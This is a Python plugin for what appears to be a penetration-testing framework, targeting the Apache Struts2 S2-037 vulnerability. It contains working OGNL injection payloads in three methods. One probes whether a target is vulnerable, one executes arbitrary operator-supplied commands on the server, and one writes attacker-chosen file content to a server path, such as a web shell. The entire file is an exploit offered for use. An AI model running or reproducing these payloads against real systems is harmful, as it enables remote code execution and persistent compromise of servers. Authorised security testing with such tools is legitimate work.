#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


from script import Script, SERVICE_PORT_MAP

class POC(Script):
    '''
    S2_037 未验证
    '''
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-037'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-037'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            prove_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#w.print(#parameters.web[0]),#w.print(#parameters.path[0]),#w.close()):xx.toString.json?&pp=/&encoding=UTF-8&web=struts2_security_vul&path=struts2_security_vul_str2037'''
            poc_key = "struts2_security_vul"
            try:
                headers = {'Content-Type': "application/x-www-form-urlencoded"}
                res = self.curl('get', self.url, params=prove_poc, headers=headers)
                if poc_key in res.headers or poc_key in res.text:
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info": self.url, "key": 'struts2_037'})
            except:
                pass

    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close()):xx.toString.json&cmd=%COMMAND%&pp=\\\\AAAA&ppp= &encoding=UTF-8'''
            headers = {}
            try:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                res = self.curl('get',self.url, params=exec_poc.replace("%COMMAND%", cmd)).text
                self.flag = 1
                self.req.append({"poc": exec_poc})
                self.res.append({"info": res, "key": cmd})
            except:
                pass


    def upload(self):
        self.get_url()
        if self.url != None:
            upload_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#path=#req.getRealPath(#parameters.pp[0]),new java.io.BufferedWriter(new java.io.FileWriter(#parameters.shellname[0]).append(#parameters.shellContent[0])).close(),#w.print(#parameters.info1[0]),#w.print(#parameters.info2[0]),#w.print(#req.getContextPath()),#w.close()):xx.toString.json&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=/&info1=oko&info2=kok/'''
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            headers =  {}
            try:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                self.curl('get', self.url,params=upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content),headers=headers)
                self.flag = 1
                self.req.append({"poc": upload_poc})
                self.res.append({"info": despath, "key": 'upload'})
            except:
                pass
